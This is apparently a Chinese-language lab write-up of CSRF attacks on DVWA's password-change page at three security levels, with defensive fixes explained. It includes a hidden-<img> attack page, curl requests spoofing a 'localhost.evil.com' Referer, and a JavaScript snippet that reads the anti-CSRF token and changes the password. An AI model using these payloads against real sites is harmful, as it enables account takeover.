DVWA-CSRF学习

- CSRF的含义

生活类比：

你登录了银行网站 → 浏览器保存了你的 Cookie/Session

你收到了一条短信："点击查看您的账单" → 其实是攻击者伪造的链接

你点了 → 浏览器自动带上 Cookie 发送请求 → 银行以为是你在操作

你的钱被转走了 → 全程你不知情

- XSS和CSRF的对比（面试必问）

|  | XSS | CSRF |
|---|---|---|
| 攻击目标 | 注入脚本到页面 | 伪造请求让受害者发送 |
| 需要 JS 吗 | ✅ 必须 | ❌ 不一定（一个 <img> 标签就能触发） |
| 受害者要做什么 | 访问被注入的页面 | 访问攻击者的恶意页面/链接 |
| 攻击者能看响应吗 | ✅ 能（JS 可读页面内容） | ❌ 不能（浏览器跨域限制） |
| 防御核心 | 输出编码 + CSP | Token + SameSite Cookie |

- DVWA的CSRF页面查看

![](images/4-DVWA-CSRF学习/4-DVWA-CSRF学习_001.png)

页面是改密码功能。你会看到一个表单：

New password

Confirm new password

Change 按钮

这就是 CSRF 的攻击目标 —— 让受害者在不知情的情况下改掉自己的密码。

- Low级

- 先正常改一次密码

把 Security Level 设为 Low，正常提交一次改密码，观察 URL 变化。

![](images/4-DVWA-CSRF学习/4-DVWA-CSRF学习_002.png)

关键发现：改密码用GET请求，所有参数都在URL里

- 构造恶意链接

攻击者只需要把这个URL发给受害者（受害者已登录了DVWA）：

![](images/4-DVWA-CSRF学习/4-DVWA-CSRF学习_003.png)
![](images/4-DVWA-CSRF学习/4-DVWA-CSRF学习_004.png)

受害者的密码就被改成了 hacked 了

- 不需要点击也能触发

攻击者在自己的恶意页面里放了一个隐藏的 <img> ：

<img src="http://192.168.103.1/vulnerabilities/csrf/?password_new=hacked&password_conf=hacked&Change=Change" width="0" height="0">

受害者打开这个页面→浏览器自动加载图片→自动发送GET请求→密码被改了，受害者完全不知情。

- 结论

完整攻击链路：

① 攻击者自己写一个恶意 HTML 文件（或搭建一个网站）

csrf_evil.html:

<html>

<body>

<h1>恭喜你中奖了！</h1>

<img src="http://192.168.103.1/vulnerabilities/csrf/?password_new=hacked&password_conf=hacked&Change=Change" width="0" height="0">

</body>

</html>

② 攻击者把这个页面放到网上，或者直接发给受害者

- 邮件里发链接："点击领取奖品"

- 论坛里发帖："看看这个"

- 甚至直接发 HTML 文件附件

③ 受害者点击打开这个页面

- 受害者已经登录了 DVWA → 浏览器存着 DVWA 的 Cookie

- 页面加载 → 浏览器发现 <img> → 自动发 GET 请求获取图片

- 请求自动带上 DVWA 的 Cookie！

- DVWA 收到带 Cookie 的请求 → 以为是受害者在改密码 → 执行

④ 受害者看到的只是"恭喜你中奖了"

- <img> 宽高都是 0 → 看不见

- 图片加载失败也不报错 → 无感知

- 密码已经被改了

这就是 CSRF 的恐怖之处：受害者只是打开了一个"中奖页面"，密码就被改了。全程无感知、无弹窗、无报错。

- Medium级

- 源码分析

核心检查逻辑：

if(stripos($_SERVER['HTTP_REFERER'], $_SERVER['SERVER_NAME']) !== false) {

// 放行 → 改密码

} else {

// 拒绝 → "That request didn't look correct"

}

$_SERVER['HTTP_REFERER'] = 请求来源页面的 URL（如 http://evil.com/attack.html）

$_SERVER['SERVER_NAME'] = 当前服务器域名（本环境为 localhost）

stripos 只是检查 Referer 字符串中是否"包含"SERVER_NAME 子串，不是做域名相等校验

关键漏洞：stripos 是子串匹配，不是域名前缀/后缀匹配。只要 Referer URL 中任何位置出现 192.168.103.1 这几个字符就放行！

- 绕过思路:

①删除Referer头 （不可行）

当 Referer 为空时的推导：

stripos("", "192.168.103.1")  →  返回 false（找不到子串）

false !== false               →  false（条件不满足）

→ 进入 else → 拒绝！❌

⚠️ 结论：删除Referer头在DVWA CSRF Medium中不能绕过！

- stripos 找不到子串返回 false，false !== false 是 false，条件不成立，被拒绝。

- 很多教程说"删除Referer可以绕过"——那只适用于代码用 empty() 或 !isset() 检查Referer的场景（空值被认为"通过"），DVWA用的是 stripos !== false，逻辑相反。

②攻击者域名包含目标域名(如localhost.evil.com)

- 绕过验证：

- 要先确认 $_SERVER['SERVER_NAME']

curl -s "http://192.168.103.1/dvwa/phpinfo.php" -b "PHPSESSID=88bq55rc7htuv0ptomknb0nfm7" | findstr "SERVER_NAME"

知道$_SERVER['SERVER_NAME'] = localhost

- 正常请求（有正确Referer）

先用 curl 模拟从 DVWA 自己页面发出的合法请求（Referer 指向本站）：

curl -s "http://192.168.103.1/dvwa/vulnerabilities/csrf/?password_new=test123&password_conf=test123&Change=Change" -H "Referer: http://localhost/dvwa/vulnerabilities/csrf/" -b "PHPSESSID=88bq55rc7htuv0ptomknb0nfm7; security=medium" | findstr "Password Changed"

![](images/4-DVWA-CSRF学习/4-DVWA-CSRF学习_005.png)

![](images/4-DVWA-CSRF学习/4-DVWA-CSRF学习_006.png)

- 预期输出：Password Changed. → ✅ 改成功了

- 为什么？ Referer 是 http://localhost/dvwa/...，里面有 localhost，检查通过。

- 攻击者域名请求（Referer不含目标域名）

模拟攻击者网站发出的跨站请求，攻击者的网站叫 evil.com，里面没有 localhost：

curl -s "http://192.168.103.1/dvwa/vulnerabilities/csrf/?password_new=hacked&password_conf=hacked&Change=Change" -H "Referer: http://evil.com/attack.html" -b "PHPSESSID=88bq55rc7htuv0ptomknb0nfm7; security=medium" | findstr "didn't look correct"

![](images/4-DVWA-CSRF学习/4-DVWA-CSRF学习_007.png)

![](images/4-DVWA-CSRF学习/4-DVWA-CSRF学习_008.png)

- That request didn't look correct. → ❌ 被拦了

- 为什么？ Referer 是 http://evil.com/...，里面没有 localhost，检查不通过。

- 攻击者域名包含目标IP（核心绕过！）

模拟攻击者用子域名/路径钓鱼，Referer 中包含 localhost（localhost.evil.com）：

curl -s "http://192.168.103.1/dvwa/vulnerabilities/csrf/?password_new=pwned&password_conf=pwned&Change=Change" -H "Referer: http://localhost.evil.com/attack.html" -b "PHPSESSID=88bq55rc7htuv0ptomknb0nfm7; security=medium" | findstr "Password Changed"

![](images/4-DVWA-CSRF学习/4-DVWA-CSRF学习_009.png)

![](images/4-DVWA-CSRF学习/4-DVWA-CSRF学习_010.png)

预期输出：Password Changed. → ✅ 绕过成功！密码被改了！

- 空Referer头（反证）

curl -v "http://192.168.103.1/dvwa/vulnerabilities/csrf/?password_new=nope&password_conf=nope&Change=Change" -H "Referer:" -b "PHPSESSID=88bq55rc7htuv0ptomknb0nfm7; security=medium"

![](images/4-DVWA-CSRF学习/4-DVWA-CSRF学习_011.png)

- 返回 That request didn't look correct ❌

- 原因：未包含 localhost

- 结论：

DVWA 的 Referer 检查用 stripos 做子串匹配，这是致命缺陷。

- ✅ 能防住：完全无关域名的跨站请求（evil.com）

- ❌ 防不住：攻击者域名里嵌入目标关键词（localhost.evil.com）

根本原因：stripos 只问"有没有这几个字母"，不问"是谁的域名"。

正确写法应该是：

// ❌ DVWA 的写法：子串包含，能被绕过

stripos($referer, $server_name) !== false

// ✅ 正确写法：解析 Referer 的 host，做严格相等比较

$referer_host = parse_url($referer, PHP_URL_HOST);

$referer_host === $server_name

|  | DVWA写法（stripos） | 正确写法（严格相等） |
|---|---|---|
| localhost | ✅ 放行 | ✅ 放行 |
| evil.com | ❌ 拒绝 | ❌ 拒绝 |
| localhost.evil.com | ✅ 放行（漏洞！） | ❌ 拒绝（正确！） |

一句话结论：

Referer 检查的思路没错，但实现方式错了——子串包含 ≠ 域名匹配。

- 攻击链路全景图

┌────────────────────────────┐

│                    攻击者准备                          │

│  1. 注册域名 evil.com                                   │

│  2. 添加子域名 localhost.evil.com → 指向攻击者服务器     │

│  3. 部署恶意页面 csrf_evil_medium.html                  │

└────────────────────────────┘

诱导点击

┌────────────────────────────┐

│                  受害者浏览器                          │

│  1. 访问 http://localhost.evil.com/attack.html             │

│  2. 页面加载 → <img> 自动发起请求                     │

│     GET http://目标站/csrf/?password_new=pwned&...     │

│     Referer: http://localhost.evil.com/attack.html          │

└────────────────────────────┘

请求+Cookie自动带上

┌────────────────────────────┐

│                  DVWA 后端检查                       │

│  stripos("http://localhost.evil.com/...", "localhost")          │

│  → 找到子串！返回 int → !== false → true → ✅ 放行      │

│  → 密码被改为 pwned                                  │

└────────────────────────────┘

- High级

- 源码分析

核心逻辑分两块：

① 两条请求通道

// 通道A：JSON 请求（Content-Type: application/json）

// 从 Header 取 token：$_SERVER['HTTP_USER_TOKEN']

// 从 JSON Body 取密码字段

// 通道B：普通表单请求（GET/POST）

// 从请求参数取 token：$_REQUEST['user_token']

// 从请求参数取密码字段

② 核心防御：Anti-CSRF Token

// 关键两行：

checkToken( $token, $_SESSION['session_token'], 'index.php' );     // 验证 token

generateSessionToken();                                      // 生成新 token

意思就是：

- 用户打开改密码页面 → 服务器生成一个随机 token

- token 存两份：① 服务器 Session 里 ② 表单隐藏字段里

- 用户提交表单 → 带上这个 token

- 服务器对比：你交的 token == 我 Session 里存的 token？

→ 一致：放行，然后生成新 token（旧的作废）

→ 不一致：拒绝

三级防御对比：

| 等级 | 防御方式 | 攻击者能否绕过？ |
|---|---|---|
| Low | 无防御 | ✅ 随便绕 |
| Medium | 检查 Referer 包含域名 | ✅ 子域名钓鱼绕过 |
| High | Anti-CSRF Token | ❌ 纯 CSRF 无法绕过 |

为什么纯 CSRF 攻不破 Token？

攻击者要改受害者的密码，需要提交：

?password_new=hacked&password_conf=hacked&user_token=???&Change=Change

^^^^^^^^

这个值攻击者不知道！

问题1：token 在受害者页面的表单里，攻击者跨域读不到（同源策略）

问题2：token 是随机生成的，攻击者猜不到

问题3：用完一次就换新的，攻击者偷到的 token 立刻过期

攻击者的网站 (evil.com)

<img src="http://目标/

csrf/?password_new=x

&user_token=???              ← 攻击者不知道 ??? 是什么

&Change=Change">

发请求

DVWA 后端

你提交的 token: ???

Session 里的 token: abc

??? ≠ abc → ❌ 拒绝！

但有一种情况能绕过：XSS + CSRF 组合拳

攻击者单独用 CSRF 攻不破 Token，但如果目标站存在 XSS 漏洞：

- 攻击者先利用 XSS 在目标站注入 JavaScript

- 注入的 JS 跑在同源下 → 可以读取页面上的 user_token

- 拿到 token 后构造完整的 CSRF 请求

- 绕过！

XSS 是 CSRF Token 的天敌——XSS 能读同源页面内容，Token 防的就是跨域读取，但 XSS 就在域内！

2、实操验证

1）先试试不带Token会怎么样

（1）先使用命令查看表里多了什么

curl -s "http://localhost/dvwa/vulnerabilities/csrf/" -b "PHPSESSID=88bq55rc7htuv0ptomknb0nfm7; security=high" | findstr "user_token"

![](images/4-DVWA-CSRF学习/4-DVWA-CSRF学习_012.png)

这个就是Token，但是每次刷新页面都会变。

（2）试试不带token发请求会怎么样

curl -s "http://localhost/dvwa/vulnerabilities/csrf/?password_new=hacked&password_conf=hacked&Change=Change" -b "PHPSESSID=88bq55rc7htuv0ptomknb0nfm7; security=high" | findstr " Password Changed"

![](images/4-DVWA-CSRF学习/4-DVWA-CSRF学习_013.png)

空的说明：请求失败，Token 不匹配被拒。

2）带上token发请求

（1）首先要获取token

curl -s "http://localhost/dvwa/vulnerabilities/csrf/" -b "PHPSESSID=88bq55rc7htuv0ptomknb0nfm7; security=high" | findstr "user_token"

![](images/4-DVWA-CSRF学习/4-DVWA-CSRF学习_014.png)

得到user_token=19a0a80c56b02669b3398d8f292556d8

（2）然后带上token发请求

curl -s "http://localhost/dvwa/vulnerabilities/csrf/?password_new=test456&password_conf=test456&user_token=19a0a80c56b02669b3398d8f292556d8&Change=Change" -b "PHPSESSID=88bq55rc7htuv0ptomknb0nfm7; security=high" | findstr "Password Changed"

![](images/4-DVWA-CSRF学习/4-DVWA-CSRF学习_015.png)

显示Password Changed 就是成功

两个结果放一起看：

- 不带 Token → 请求直接被忽略 → 密码没改    ← 这就是 Token 防御的效果

- 带上 Token → 请求正常处理 → 密码改了    ← Token 正确才放行

攻击者的困境：他不知道 token 是什么，也没法跨域读到，所以构造不出合法请求。这就是 Anti-CSRF Token 为什么是业界标准防御方案。

3）XSS+CSRF组合拳——攻破 Token 防御

（1）攻击思路：

Token 防的是跨域读取，但 XSS 在同源内执行，同源策略管不着自己人。

- 纯 CSRF（跨域）：  攻击者网站 → 读目标站 Token → ❌ 同源策略拦住

- XSS + CSRF（同源）：目标站自己页面 → 读目标站 Token → ✅ 自己读自己，谁拦？

（2）完整攻击链路

第1步：攻击者在 XSS Stored 页面注入恶意 JS

↓

第2步：受害者浏览 XSS Stored 页面（比如留言板）

↓

第3步：恶意 JS 在受害者浏览器里执行（同源！）

↓

第4步：JS 用 fetch 请求 CSRF 页面 → 拿到 user_token

↓

第5步：JS 构造带 token 的改密码请求 → 自动提交

↓

第6步：DVWA 验证 token 正确 → ✅ 放行 → 密码被改

（3）实操

首先F12打开控制台，输入这段JS

fetch('/dvwa/vulnerabilities/csrf/')

.then(r => r.text())

.then(html => {

let match = html.match(/user_token' value='([^']+)'/);

if (match) {

let token = match[1];

console.log('偷到的 Token:', token);

fetch('/dvwa/vulnerabilities/csrf/?password_new=pwned&password_conf=pwned&user_token=' + token + '&Change=Change')

.then(r => r.text())

.then(resp => {

console.log('服务器响应:', resp.match(/<pre>(.*?)<\/pre>/)?.[1]);

});

} else {

console.log('Token 提取失败，看看 HTML:', html.substring(0, 500));

}

});

![](images/4-DVWA-CSRF学习/4-DVWA-CSRF学习_016.png)

密码就成功修改成了pwned了

代码拆解：

// ============第一步：偷 Token ============

fetch('/dvwa/vulnerabilities/csrf/')

含义：用 fetch 请求 CSRF 改密码页面。就像你用浏览器打开那个页面一样，但这是 JS 在后台悄悄请求，用户看不到。

.then(r => r.text())

含义：拿到响应后，把内容转成纯文本（HTML 源码字符串）。r 是响应对象，.text() 把它读成字符串。

.then(html => {

含义：拿到 HTML 文本后，进入这个函数处理。此时 html 就是 CSRF 页面的完整源码，里面有我们要偷的 token。

let match = html.match(/user_token' value='([^']+)'/);

含义：用正则表达式从 HTML 中提取 token 值。

拆解正则 user_token' value='([^']+)'：

user_token' value='     → 匹配这段固定文字（页面里 token 字段的 HTML）

([^']+)                → 括号是"捕获组"，[^']+ 表示"一个或多个非单引号的字符"

→ 这就是要偷的 token 值！

'                       → 匹配结尾的单引号

DVWA 页面里的 HTML 长这样：

<input type='hidden' name='user_token' value='abc123def456...'>

正则匹配后，match[1] 就是 abc123def456...

if (match) {

含义：如果正则匹配到了（token 存在），进入成功分支。

let token = match[1];

含义：match[1] 是正则第一个括号捕获的内容，也就是 token 的值。存到变量 token 里。

console.log('偷到的 Token:', token);

含义：在控制台打印偷到的 token，让你亲眼看到偷到了什么。

// ========== 第二步：用偷来的 Token 改密码 ==========

fetch('/dvwa/vulnerabilities/csrf/?password_new=pwned&password_conf=pwned&user_token=' + token + '&Change=Change')

含义：构造完整的改密码请求 URL，把偷到的 token 拼进去。

拼出来的完整URL：

/dvwa/vulnerabilities/csrf/?password_new=pwned&password_conf=pwned&user_token=abc123def456...&Change=Change

逐个参数：

| 参数 | 值 | 含义 |
|---|---|---|
| password_new | pwned | 新密码 |
| password_conf | pwned | 确认新密码 |
| user_token | abc123... | 偷来的 Token！ |
| Change | Change | 提交按钮的值 |

.then(r => r.text())

含义：拿到改密码的响应，转成文本。

.then(resp => {

console.log('服务器响应:', resp.match(/<pre>(.*?)<\/pre>/)?.[1]);

});

含义：从响应 HTML 中提取 <pre> 标签里的内容并打印。

DVWA 成功时返回 <pre>Password Changed.</pre>，失败时返回 <pre>Passwords did not match.</pre>。这个正则把 <pre> 和 </pre> 之间的文字提取出来，让你一眼看到结果。

} else {

console.log('Token 提取失败，看看 HTML:', html.substring(0, 500));

}

含义：如果正则没匹配到 token（比如页面结构变了），打印 HTML 前 500 个字符，帮你排查问题。

全流程一图看懂

fetch('/dvwa/vulnerabilities/csrf/')        ← ① 偷偷请求 CSRF 页面

.then(r => r.text())                     ← ② 拿到 HTML 源码

html.match(/user_token' value='(...)'/)  ← ③ 正则提取 token

token = match[1]                         ← ④ 保存 token 值

fetch('/csrf/?...&user_token=' + token)  ← ⑤ 带 token 发改密码请求

Password Changed.                        ← ⑥ 密码改了！攻击成功！

这段 JS 跑在 DVWA 页面的控制台里

- 和 DVWA 是同源（同一个域名/端口/协议）

- 同源策略允许：读取响应内容、携带 Cookie

- 所以 fetch 能拿到 HTML → 能提取 token → 能带 Cookie 提交请求

如果是攻击者的网站 evil.com 执行同样代码：

→ 跨域请求 → 同源策略拦住 → 读不到响应内容 → 拿不到 token → 失败

这就是 XSS + CSRF 组合攻击的本质：XSS 让攻击者的 JS 在同源内执行，绕过了同源策略，Token 防御就失效了。

- 总结

| 等级 | 防御方式 | 纯CSRF能绕过吗 | XSS+CSRF能绕过吗 | 评价 |
|---|---|---|---|---|
| Low | 无 | ✅ 随便绕 | ✅ | 无防御 |
| Medium | Referer 检查（stripos） | ✅ 子域名钓鱼绕过 | ✅ | 实现有缺陷 |
| High | Anti-CSRF Token | ❌ 无法绕过 | ✅XSS辅助可以绕过 | 业界标准，但是怕XSS |

- Anti-CSRF Token 是正确的防御方向，纯 CSRF 确实攻不破

- 但 XSS 是一切防御的天敌——只要存在 XSS，Token、Referer 等防御全部失效

- 防御必须整体做：修好 XSS 漏洞 + 部署 CSRF Token + 设置 SameSite Cookie，缺一不可
